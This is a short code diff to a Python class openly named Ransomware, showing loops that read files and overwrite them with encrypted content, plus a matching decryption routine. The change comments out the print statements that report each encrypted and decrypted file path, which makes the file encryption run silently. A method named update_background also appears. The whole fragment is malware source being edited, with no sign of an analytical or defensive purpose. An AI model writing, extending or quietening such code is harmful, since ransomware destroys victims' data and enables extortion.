@@ -67,7 +67,7 @@ class Ransomware:
                             content = readf.read()
                         with open(filepath, 'wb') as writef:
                             writef.write(self.encryptor.encrypt(content))
-                        print('Encrypted: ', filepath)
+                        #print('Encrypted: ', filepath)
         self.encryptor = None
         self.fernetkey = None
         
@@ -88,7 +88,7 @@ class Ransomware:
                         with open(filepath, 'wb') as writef:
                             decfile = self.encryptor.decrypt(contents)
                             writef.write(decfile)
-                        print('decrypted :', filepath)
+                        #print('decrypted :', filepath)
 
     
     def update_background(self):
